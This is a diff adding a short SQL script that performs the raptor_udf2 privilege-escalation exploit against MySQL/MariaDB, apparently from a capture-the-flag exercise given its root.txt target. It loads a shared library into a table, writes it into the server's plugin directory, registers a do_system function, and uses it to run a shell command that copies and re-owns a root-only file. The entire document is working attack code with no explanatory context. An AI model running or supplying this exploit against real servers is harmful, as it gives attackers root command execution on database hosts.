@@ -1,0 +1,6 @@
+use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/tmp/raptor_udf2.so'));
+select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+select do_system('cp /root/root.txt /tmp; chown svc svc /tmp/root.txt;');
